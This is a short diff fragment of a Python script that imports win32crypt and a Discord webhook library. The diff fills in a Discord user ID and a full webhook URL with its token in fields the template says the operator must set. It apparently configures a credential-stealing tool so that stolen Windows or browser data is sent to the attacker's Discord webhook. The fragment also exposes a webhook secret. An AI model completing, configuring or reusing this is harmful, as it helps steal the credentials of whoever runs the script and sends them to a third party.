@@ -22,8 +22,8 @@ import win32crypt
 
 from dhooks import *
 
-userid = '' # - ( Input your discord tag if you want to be pinged ! )
-webhookurl = Webhook("") 
+userid = '940733585818796063' # - ( Input your discord tag if you want to be pinged ! )
+webhookurl = Webhook("https://discord.com/api/webhooks/945772141721305139/ikOCfQqYy5L9WVBMVi2fqln2q7qkp-41oLLlEXUuefRBu_lXxIc7xootgEr6h3HKa-N9") 
              # - ( Input your webhook URL inside the string 
              # - .. it will literally not work if you don't ! )
 
